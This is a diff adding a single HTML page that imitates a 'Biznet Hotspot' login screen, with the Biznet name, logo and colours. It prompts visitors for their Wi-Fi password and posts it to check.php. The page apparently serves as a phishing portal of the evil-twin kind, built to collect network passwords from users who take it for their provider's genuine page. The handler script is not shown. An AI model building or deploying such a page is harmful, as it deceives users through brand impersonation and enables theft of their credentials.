@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="id">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Biznet Hotspot</title>
+    <style>
+        body {
+            font-family: 'Open Sans', sans-serif;
+            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
+            /* Biznet vibe gradient */
+            background: #f0f4f8;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 380px;
+            text-align: center;
+            border-top: 5px solid #005eb8;
+            /* Biznet Blue */
+        }
+
+        .logo {
+            width: 160px;
+            margin-bottom: 25px;
+        }
+
+        h3 {
+            color: #333;
+            margin-bottom: 5px;
+        }
+
+        p {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 25px;
+        }
+
+        input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #dcdcdc;
+            border-radius: 20px;
+            box-sizing: border-box;
+            text-align: center;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #005eb8;
+            color: white;
+            border: none;
+            border-radius: 20px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #004a91;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <img src="logo.png" alt="Biznet" class="logo">
+        <h3 style="color: #005eb8;">Welcome Back!</h3>
+        <p>Please enter your Wi-Fi password to connect.</p>
+
+        <form method="POST" action="check.php">
+            <input type="password" name="password" placeholder="Wi-Fi Password" required>
+            <button type="submit">CONNECT</button>
+        </form>
+    </div>
+</body>
+
+</html>
